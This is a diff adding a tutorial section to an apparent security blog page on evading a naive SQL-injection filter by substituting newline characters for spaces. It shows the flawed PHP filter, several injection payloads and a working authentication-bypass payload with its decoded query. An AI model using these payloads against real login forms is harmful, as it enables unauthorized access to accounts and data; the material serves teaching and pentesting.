@@ -1980,6 +1980,176 @@ SELECT%09name%0AFROM%09users
 
 <p>No-quote and no-space payloads are all about <strong>adaptive syntax evasion</strong>. Think like a compiler. Feed it what it accepts, not what looks normal.</p>
 
+<h1 id="bypassing-basic-sql-injection-filters-using-alternate-whitespace-characters">Bypassing Basic SQL Injection Filters Using Alternate Whitespace Characters</h1>
+
+<p>Imagine you’re pentesting a web app. The login form has a filter on the <code class="language-plaintext highlighter-rouge">username</code> input to block common SQL keywords and spaces trying to stop classic SQL injection attempts.</p>
+
+<p>Here’s what the developer coded:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+$filters = [' ', 'AND', 'and', 'OR', 'or', 'UNION', 'SELECT'];
+foreach ($filters as $filter) {
+    $username = str_replace($filter, '', $username);
+}
+</code></pre>
+</div>
+
+<p>This means <strong>any spaces and SQL keywords</strong> like <code class="language-plaintext highlighter-rouge">AND</code>, <code class="language-plaintext highlighter-rouge">OR</code>, <code class="language-plaintext highlighter-rouge">UNION</code>, <code class="language-plaintext highlighter-rouge">SELECT</code> get wiped out from the username before the query runs.</p>
+
+<hr />
+
+<h2 id="the-challenge">The Challenge</h2>
+
+<p>You try a basic SQL injection payload to bypass authentication:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+1' OR 1=1 --
+</code></pre>
+</div>
+
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*c9bEDGQx5TaUGc50g1hPxA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>But the filter instantly strips spaces and keywords your input becomes:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+1'OR1=1--
+</code></pre>
+</div>
+
+<p>This mangled input breaks the SQL syntax, causing an error.</p>
+
+<p>You then try URL encoding spaces and special characters:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+1%27%20OR%201=1%20--+
+</code></pre>
+</div>
+
+<p><img src="https://cdn-images-1.medium.com/max/2000/1*c9bEDGQx5TaUGc50g1hPxA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>But no dice the server still filters spaces <em>after decoding</em>, so the spaces are removed again, and the payload fails.</p>
+
+<hr />
+
+<h2 id="finding-the-weak-spot">Finding the Weak Spot</h2>
+
+<p>The filter only targets literal <strong>space characters</strong> (<code class="language-plaintext highlighter-rouge">0x20</code>) and keywords in uppercase or lowercase. But it <strong>does not filter other whitespace characters</strong>, such as:</p>
+
+<ul>
+  <li>
+    <p>Tabs (<code class="language-plaintext highlighter-rouge">%09</code>)</p>
+  </li>
+  <li>
+    <p>Newlines (<code class="language-plaintext highlighter-rouge">%0A</code>)</p>
+  </li>
+  <li>
+    <p>Carriage returns (<code class="language-plaintext highlighter-rouge">%0D</code>)</p>
+  </li>
+</ul>
+
+<p>SQL parsers treat these alternate whitespace characters <strong>just like spaces</strong> when parsing queries.</p>
+
+<hr />
+
+<h2 id="the-bypass">The Bypass</h2>
+
+<p>So instead of spaces, you replace them with newline characters (<code class="language-plaintext highlighter-rouge">%0A</code>):</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+1'%0A||%0A1=1%0A--%27+
+</code></pre>
+</div>
+
+<p>This payload, when URL-decoded, looks like:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+1'
+||
+1=1
+--
+'
+</code></pre>
+</div>
+
+<p>The SQL engine reads the newlines as spaces and interprets the query as:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT username, password FROM users WHERE username = '1' || 1=1 --';
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">||</code> is the logical OR operator in some SQL dialects.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">1=1</code> is always true.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">--</code> comments out the rest of the query.</p>
+  </li>
+</ul>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4k-WTEUjdbt4Z6RTzI42Gg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The result? The WHERE clause always passes, granting unauthorized access.</p>
+
     </section>
 
     <footer class="mt-8 text-sm text-gray-400">
